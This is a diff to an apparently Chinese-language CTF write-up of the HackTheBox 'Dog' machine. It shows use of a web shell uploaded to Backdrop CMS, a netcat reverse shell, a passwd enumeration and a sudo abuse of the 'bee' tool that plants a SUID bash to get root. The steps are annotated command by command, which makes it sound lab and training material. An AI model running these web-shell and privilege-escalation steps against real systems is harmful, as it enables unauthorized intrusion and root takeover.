@@ -98,12 +98,71 @@ $tar -czvf shell.tar.ga shell //将当前目录中的 shell 文件或文件夹 �
 ![小黑哒](images/0003.png)
 
 ####  下面是对这exploit.py的使用2 需要这么做
+
 【1】Manual installion 手动上传成功，前往URL：http://dog.htb/modules/shell/shell.php
+
 结果：Not Found
+
 【2】Manual installion 手动上传成功[+1],前往URL：http://dog.htb/modules/shell/shell.php?cmd=id
+
 结果：有回应了并且有个输入框
+
 【3】Manual installion 手动上传成功[+1]，开启nc监听，在输入框里输入内容并回车
-![一切都不是必须的肯定](images/7006]
+
+![一切都不是必须的肯定](images/7006.png)
+
+```
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+$export TEMT=xtemt
+$ ^Z
+>> stty raw -echo; fg
+$
+
+www-data@dog:/var/www/html$ cat /etc/passwd | grep 'sh$' |awk -F: '{print $1}'
+root
+jobert
+johncusack
+
+$ su johncusack
+johncusack@dog:/var/www/html$ ls  /home/johncusack/user.txt
+
+johncusack@dog:~$ sudo -l
+    (ALL : ALL) /usr/local/bin/bee
+```
+
+
+## 第三个卡住我的点 /usr/local/bin/bee 的使用
+
+https://github.com/backdrop-contrib/bee/wiki/Usage
+
+```
+johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami && id');"
+
+
+johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cp /bin/bash /tmp/bash && chmod u+s /tmp/bash');"
+
+```
+###### sudo 让 bee 有了 root 权限 → bee 再 system() 启动 bash → bash 就是 root shell
+```
+sudo /usr/local/bin/bee               //以超级用户权限执行后面的命令//bee 是一个可执行文件
+--root=/var/www/html                  //--root指定要使用的Backdrop安装根目录  //指定 bee 的根目录为 /var/www/html     
+eval                                  //这是 bee 工具的一个子命令，意为“执行代码”或“运行表达式”
+"echo shell_exec('whoami && id');"    //shell_exec()：PHP 函数，用于执行系统命令，并返回其输出
+
+cp /bin/bash /tmp/bash                //拷贝 /bin/bash（bash shell 程序）到 /tmp/bash  ///bin/bash 是系统文件，通常不能直接改权限///tmp 是通用可写目录
+&&                                    //两个命令连续执行：如果拷贝成功，再设置权限
+chmod u+s /tmp/bash                   //给 /tmp/bash 添加 SUID 权限，使得它以后 无论谁执行，都会以 root 身份运行
+```
+##### 在目标系统上利用 Web 执行权限，创建一个带有 SUID 权限的 Bash，从而获得 root shell
+
+```
+ls -la /tmp/bash
+/tmp/bash -p       //用 root 身份启动 shell，获得提权 //-p:保留当前“有效的用户 ID”权限
+ls /root/root.txt
+```
+
+
+
 
 
 
